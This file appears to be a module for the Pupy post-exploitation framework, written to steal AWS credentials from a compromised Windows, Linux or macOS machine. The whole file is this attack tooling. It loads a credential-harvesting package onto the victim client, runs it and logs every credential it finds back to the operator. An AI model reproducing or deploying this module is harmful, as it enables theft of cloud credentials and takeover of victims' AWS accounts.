# -*- coding: UTF8 -*-
# Author: @BradErz
# Contributor(s):

from pupylib.PupyModule import *

__class_name__ = "AWSCredentials"

@config(compatibilities=['windows', 'linux', 'darwin'], category="creds")
class AWSCredentials(PupyModule):
    """Get AWS credntials from a users pc"""
    is_module = False

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="aws_credentials", description=self.__doc__)

    def run(self, args):
        self.client.load_package("aws_credentials")
        aws_creds = self.client.conn.modules['aws_credentials'].AWSCredentials()
        aws_creds.run()

        if aws_creds.creds_found:
            for item in aws_creds.creds_found:
                self.log("Found: " + item)
        else:
            self.log("Couldn't find anything ;(")